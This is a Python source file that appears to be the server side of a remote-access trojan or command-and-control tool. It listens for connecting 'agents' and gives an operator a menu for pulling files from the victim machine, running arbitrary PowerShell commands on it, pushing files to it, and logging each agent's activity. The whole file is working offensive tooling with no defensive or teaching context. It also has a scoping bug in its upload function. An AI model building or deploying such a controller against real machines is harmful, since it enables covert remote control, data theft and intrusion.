import socket
import os
from datetime import datetime

def upload_file(client_socket, file_path):
    try:
        send_file(client_socket, file_path)
        track_agent_activity(agent_id, f"Uploaded file: {file_path}")
        # Send a signal to the client indicating that the file upload is complete
        client_socket.send("File upload complete".encode('utf-8'))
    except Exception as e:
        print(f"Error uploading file: {e}")
        
        


def receive_file(client_socket, file_path):
    save_directory = r"C:\Users\User\OneDrive\Desktop"  # Specify the directory where you want to save the file
    os.makedirs(save_directory, exist_ok=True)  # Create the directory if it doesn't exist

    try:
        file_name = os.path.basename(file_path.strip())
        abs_file_path = os.path.abspath(os.path.join(save_directory, file_name))
        print(f"Saving file to: {abs_file_path}")

        with open(abs_file_path, "wb") as file:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                print(f"Received data length: {len(data)}")
                file.write(data)

        print(f"File saved successfully at: {abs_file_path}")

        # Sending acknowledgment back to the client
        client_socket.send("File received successfully".encode('utf-8'))

        # Ensure the file is closed before returning
        file.close()

        with open(abs_file_path, "rb") as file:
            file_content = file.read()
            print(f"Content of saved file length: {len(file_content)}")

        # Add a return statement to break out of the file processing loop
        return True

    except OSError as e:
        print(f"OS Error ({e.errno}): {e.strerror}")
    except Exception as e:
        print(f"Error while receiving file: {e}")

    # Return False if there was an issue with file processing
    return False


def send_file(client_socket, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()

        client_socket.send(file_data)
        print(f"File sent successfully: {file_path}")

        acknowledgment = client_socket.recv(4096).decode('utf-8')
        print(acknowledgment)

        if acknowledgment == "File received successfully":
            client_socket.send("next_menu".encode('utf-8'))
            return True
        else:
            print("Error receiving file acknowledgment.")
            return False

    except FileNotFoundError:
        print(f"File not found: {file_path}")
        client_socket.send(f"File not found: {file_path}".encode('utf-8'))
        return False

    except Exception as e:
        print(f"Error sending file: {e}")
        return False


def track_agent_activity(agent_id, activity):
    if agent_id not in online_agents:
        online_agents[agent_id] = {'last_activity': None, 'activities': []}

    online_agents[agent_id]['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    online_agents[agent_id]['activities'].append(activity)


def update_online_agents(agent_id):
    if agent_id not in online_agents:
        online_agents[agent_id] = {'last_activity': None, 'activities': []}


def view_online_agents():
    print("Online Agents:")
    for agent_id, agent_info in online_agents.items():
        print(f"Agent ID: {agent_id}, Last Activity: {agent_info['last_activity']}")


def view_agent_activities(agent_id):
    if agent_id in online_agents:
        print(f"Activities for Agent ID {agent_id}:")
        for activity in online_agents[agent_id]['activities']:
            print(activity)
    else:
        print(f"Agent ID {agent_id} not found.")


# Initialize online_agents dictionary to store agent information
online_agents = {}


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 1234))
    server.listen(5)

    print("Server is listening...")

    client_socket, client_address = server.accept()
    print(f"Connection from {client_address}")

    # Get Agent ID from the client
    agent_id = client_socket.recv(4096).decode('utf-8')
    update_online_agents(agent_id)

    while True:
        choice = input(
            "Enter your choice (1: Download File, 2: Access PowerShell, 3: Upload File, 4: View Online Agents, "
            "5: View Agent Activities, exit: Exit): ")

        if choice == '1':
            command = input("Enter the file path to download from the client: ")
            client_socket.send(f"get {command}".encode('utf-8'))
            receive_file(client_socket, command)
            track_agent_activity(agent_id, f"Downloaded file: {command}")
        elif choice == '2':
            while True:
                command = input("Enter command to execute on the client (type 'exit' to return to choice selection): ")
                if command.lower() == 'exit':
                    break
                client_socket.send(command.encode('utf-8'))
                output = client_socket.recv(4096).decode('utf-8')
                print(output)
                track_agent_activity(agent_id, f"Executed command: {command}")
        elif choice == '3':
            file_path = input("Enter the full path of the file to upload: ").replace('"', '')
            client_socket.send(f"send {file_path}".encode('utf-8'))
            upload_file(client_socket, file_path)  # Call the new function
            # Wait for acknowledgment from the client that file upload is complete
            acknowledgment = client_socket.recv(4096).decode('utf-8')
            print(acknowledgment)
            if acknowledgment == "File upload complete":
                continue  # Proceed to the next iteration
            else:  
                 print("Error receiving file acknowledgment.")
            break
        elif choice == '4':
            view_online_agents()
        elif choice == '5':
            view_agent_activities(agent_id)
        elif choice.lower() == 'exit':
            client_socket.send(choice.encode('utf-8'))
            break
        else:
            print("Invalid choice. Please try again.")

    client_socket.close()
    server.close()

if __name__ == "__main__":
    main()
